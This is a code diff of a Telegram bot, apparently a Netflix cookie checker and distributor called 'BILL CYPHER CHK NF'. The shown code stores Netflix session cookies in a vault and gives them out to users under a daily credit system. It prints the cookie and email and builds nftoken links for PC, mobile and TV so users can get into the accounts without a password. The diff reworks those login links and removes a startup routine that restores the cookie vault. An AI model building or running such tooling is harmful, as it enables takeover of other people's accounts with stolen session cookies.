@@ -2,9 +2,9 @@
 """
 BILL CYPHER CHK NF — Edition 5G Turbo
 • Cero cruce de perfiles (100% Exact Match)
-• Sin enlaces rotos (Cero NSES-404)
-• Persistencia automática en la nube de Telegram (Anti-Redeploy wipe)
-• Tipografía estilizada Sans-Bold Italic
+• Enlaces oficiales de TV (/tv8) y Móvil sin 404
+• Persistencia automática en la nube de Telegram (Anti-Wipe)
+• Tipografía Sans-Bold Italic
 """
 
 import os
@@ -18,6 +18,7 @@ import zipfile
 import json
 import re
 import functools
+import threading
 from datetime import date
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor
@@ -100,7 +101,7 @@ def to_sans_bold_italic(text: str) -> str:
 
 
 # ===========================================================================
-# 3. SISTEMA DE CRÉDITOS (15 DIARIOS / SIN PÉRDIDAS)
+# 3. SISTEMA DE CRÉDITOS (15 DIARIOS POR DEFECTO / REEMBOLSO AUTOMÁTICO)
 # ===========================================================================
 DAILY_FREE_CREDITS: int = 15
 _CREDITS_FILE = Path("credits.json")
@@ -225,7 +226,7 @@ def out_of_credits_markup() -> InlineKeyboardMarkup:
 
 
 # ===========================================================================
-# 4. BAÚL ESTRUCTURADO (ALMACENAMIENTO DE PAQUETES VERIFICADOS)
+# 4. BAÚL ESTRUCTURADO (DEDUPLICACIÓN TOTAL & DATOS EXACTOS)
 # ===========================================================================
 _VAULT_FILE = Path("cookie_vault.json")
 _NETFLIX_MARKERS = ("NetflixId", "SecureNetflixId", "nfvdid", "netflix.com")
@@ -340,18 +341,25 @@ def extract_all_accounts_from_bytes(raw_bytes: bytes, filename: str = "") -> lis
 
 
 # ===========================================================================
-# 5. GENERACIÓN ROBUSTA DE ENLACES (CERO NSES-404)
+# 5. GENERACIÓN ROBUSTA DE ENLACES (PANTALLA DE ACTIVACIÓN TV /TV8)
 # ===========================================================================
 def build_official_login_keyboard(raw_token: str) -> InlineKeyboardMarkup:
-    """Usa el endpoint oficial de Netflix /browse?nftoken= que nunca da error 404."""
+    """
+    Construye los botones exactos:
+    • TV: Abre https://www.netflix.com/tv8?nftoken=... para activar el código de 8 dígitos.
+    • Móvil: Abre https://www.netflix.com/YourAccount?nftoken=... en Safari sin forzar la app.
+    • PC: Abre https://www.netflix.com/browse?nftoken=... para acceso completo.
+    """
     token = raw_token.strip()
-    direct_url = f"https://www.netflix.com/browse?nftoken={token}"
+    pc_url = f"https://www.netflix.com/browse?nftoken={token}"
+    mobile_url = f"https://www.netflix.com/YourAccount?nftoken={token}"
+    tv_url = f"https://www.netflix.com/tv8?nftoken={token}"
 
     buttons = [
         [
-            InlineKeyboardButton("🖥️ 𝙋𝘾 ↗️", url=direct_url),
-            InlineKeyboardButton("📱 𝙈𝙤́𝙫𝙞𝙡 ↗️", url=direct_url),
-            InlineKeyboardButton("📺 𝙏𝙑 ↗️", url=direct_url),
+            InlineKeyboardButton("🖥️ 𝙋𝘾 ↗️", url=pc_url),
+            InlineKeyboardButton("📱 𝙈𝙤́𝙫𝙞𝙡 ↗️", url=mobile_url),
+            InlineKeyboardButton("📺 𝙏𝙑 ↗️", url=tv_url),
         ],
         [
             InlineKeyboardButton("🔄 𝙍𝙀𝙂𝙀𝙉 𝘾𝙊𝙊𝙆𝙄𝙀", callback_data="panel:gencookie"),
@@ -760,37 +768,6 @@ def _cancel_keyboard(msg_id: int) -> InlineKeyboardMarkup:
 # ---------------------------------------------------------------------------
 # Formateadores de tarjetas de resultados
 # ---------------------------------------------------------------------------
-
-def _flag(country: str) -> str:
-    country = (country or "").strip()
-    for ch in country:
-        if 0x1F1E6 <= ord(ch) <= 0x1F1FF:
-            return ""
-    code = country.upper()
-    if len(code) == 2 and code.isalpha():
-        return chr(0x1F1E6 + ord(code[0]) - ord("A")) + chr(0x1F1E6 + ord(code[1]) - ord("A"))
-    NAME_MAP = {
-        "india": "IN", "poland": "PL", "portugal": "PT",
-        "united states": "US", "usa": "US", "uk": "GB",
-        "united kingdom": "GB", "germany": "DE", "france": "FR",
-        "italy": "IT", "spain": "ES", "brazil": "BR", "mexico": "MX",
-        "canada": "CA", "australia": "AU", "netherlands": "NL",
-        "turkey": "TR", "russia": "RU", "japan": "JP",
-        "south korea": "KR", "indonesia": "ID", "thailand": "TH",
-        "vietnam": "VN", "pakistan": "PK", "bangladesh": "BD",
-        "argentina": "AR", "colombia": "CO", "chile": "CL",
-        "romania": "RO", "ukraine": "UA", "sweden": "SE",
-        "norway": "NO", "denmark": "DK", "finland": "FI",
-        "czech": "CZ", "hungary": "HU", "slovakia": "SK",
-        "croatia": "HR", "serbia": "RS", "bulgaria": "BG",
-        "greece": "GR", "israel": "IL", "saudi arabia": "SA",
-        "uae": "AE", "egypt": "EG", "nigeria": "NG",
-        "south africa": "ZA", "kenya": "KE",
-    }
-    code2 = NAME_MAP.get(country.lower())
-    if code2:
-        return chr(0x1F1E6 + ord(code2[0]) - ord("A")) + chr(0x1F1E6 + ord(code2[1]) - ord("A"))
-    return ""
 
 def _country_display(country: str) -> str:
     flag = _flag(country)
@@ -1301,9 +1278,11 @@ async def send_hits_zip(update: Update, hits: list[tuple[dict, str, str]]) -> No
         if nft.get("success"):
             token_val = nf_id
             pc_lnk = f"https://www.netflix.com/browse?nftoken={token_val}"
+            mob_lnk = f"https://www.netflix.com/YourAccount?nftoken={token_val}"
+            tv_lnk = f"https://www.netflix.com/tv8?nftoken={token_val}"
             lines.append(box_line("💻 PC:", pc_lnk))
-            lines.append(box_line("📱 Móvil:", pc_lnk))
-            lines.append(box_line("📺 TV:", pc_lnk))
+            lines.append(box_line("📱 Móvil:", mob_lnk))
+            lines.append(box_line("📺 TV:", tv_lnk))
             if nft.get("expires"):
                 lines.append(box_line("Expires:", nft["expires"]))
         else:
@@ -1738,7 +1717,7 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             )
             return
 
-        await query.answer("⚡ Extrayendo cuenta...")
+        await query.answer("⚡ Obteniendo cuenta...")
 
         # Extracción y entrega instantánea (< 0.05s) sin esperas de red
         chosen_acc = None
@@ -1781,7 +1760,7 @@ async def panel_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
             f"● 📧 <b>" + to_sans_bold_italic("Email:") + f"</b> <code>{email}</code>\n"
             "━━━━━━━━━━━━━━━━━━━━━━\n"
             f"🍪 <b>" + to_sans_bold_italic("Cookie (Toca para copiar):") + f"</b>\n<code>{clean_cookie}</code>\n\n"
-            "<i>Presiona un botón para entrar directo sin contraseña o generar otra:</i>\n"
+            "<i>Presiona un botón para ingresar o activar tu TV:</i>\n"
             "<i>💡 Si tu navegador ya tenía una sesión abierta, usa pestaña incógnito para ver este perfil directo.</i>"
         )
         kb = build_official_login_keyboard(token_for_url)
@@ -2832,24 +2811,6 @@ def main() -> None:
         asyncio.create_task(_session_watchdog())
         global _BOT_USERNAME
         _BOT_USERNAME = (await application.bot.get_me()).username or ""
-
-        # Auto-restauración silenciosa en arranque usando el mensaje fijado en Telegram
-        try:
-            if not _VAULT_FILE.exists() or len(_load_vault()) == 0:
-                chat = await application.bot.get_chat(OWNER_ID)
-                if chat.pinned_message and chat.pinned_message.document:
-                    f = await chat.pinned_message.document.get_file()
-                    b = await f.download_as_bytearray()
-                    d = json.loads(b.decode("utf-8", errors="replace"))
-                    if "vault" in d:
-                        _save_vault(d["vault"])
-                    if "credits" in d:
-                        _save_credits(d["credits"])
-                    if "users" in d and isinstance(d["users"], list):
-                        _USERS_FILE.write_text("\n".join(d["users"]) + "\n", encoding="utf-8")
-                    logger.info("Base de datos restaurada automáticamente desde la nube de Telegram.")
-        except Exception as e:
-            logger.debug(f"Auto-restore on init: {e}")
 
         user_commands = [
             BotCommand("start",    "Panel principal"),
